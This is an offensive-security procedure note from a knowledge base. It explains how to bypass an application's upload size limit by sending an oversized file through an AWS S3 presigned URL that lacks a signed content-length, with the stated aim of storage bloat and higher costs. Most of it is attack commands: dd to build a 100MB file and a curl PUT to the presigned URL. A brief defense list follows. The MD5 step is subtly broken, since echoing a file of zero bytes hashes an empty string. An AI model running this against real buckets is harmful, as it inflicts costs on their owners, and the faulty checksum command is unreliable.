---
id: proc-uuid-3
tags:
  - s3-upload
  - presigned-url
  - bypass
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-upload-to-presigned-url]]'
verified: false
platforms:
  - Cloud (AWS)
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Remote File Copy]]'
updated_at: '2025-12-14T05:32:10.040Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Remote File Copy]]'
---
# Upload-Oversized-File-to-S3-via-Presigned-URL

## Summary

Use the presigned URL from the falsified request to upload a file much larger than the specified byte_size, bypassing app-level validations.

## Description

With the presigned URL lacking a signed content-length, S3 accepts the PUT request regardless of size. This procedure simulates browser/client behavior, uploading up to 5GB, potentially causing storage bloat or costs.

## Requirements

1. Presigned URL from previous step
2. Large test file (e.g., dd if=/dev/zero of=largefile.txt bs=1M count=100)
3. Actual MD5 checksum of the large file

## Defense

Defensive measures and detection strategies:

- Add bucket policy limiting object sizes
- Whitelist content-length in Rails presigned_url
- Monitor S3 for large PUTs via metrics/alarms

## Objectives

1. Successfully store oversized file in S3
2. Confirm no enforcement by S3
3. Demonstrate impact like cost increase

## Instructions

### Step 1: Prepare Large File and Checksum

**Context**: Create oversized file and compute its MD5.

```bash
dd if=/dev/zero of=largefile.txt bs=1M count=100
echo -n $(cat largefile.txt) | openssl md5 -binary | base64
```

> Output: 100MB file and base64 MD5.

### Step 2: Perform PUT Upload

**Context**: Send the large file to S3 URL with correct headers but mismatched size.

Execute [[commands/curl-upload-to-presigned-url]]:

```bash
curl -X PUT -T largefile.txt "https://bucket.s3.amazonaws.com/key?X-Amz-Algorithm=AWS4-HMAC-SHA256&..." \
  -H "Content-Type: text/plain" \
  -H "Content-MD5: ACTUAL_LARGE_MD5_BASE64"
```

> Expected: HTTP/1.1 200 OK.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Remote File Copy]]

### Sub-Techniques


## Commands Used

- [[commands/curl-upload-to-presigned-url]]

## Tools Used

- [[tools/curl]]

## Tags

- s3-upload
- presigned-url
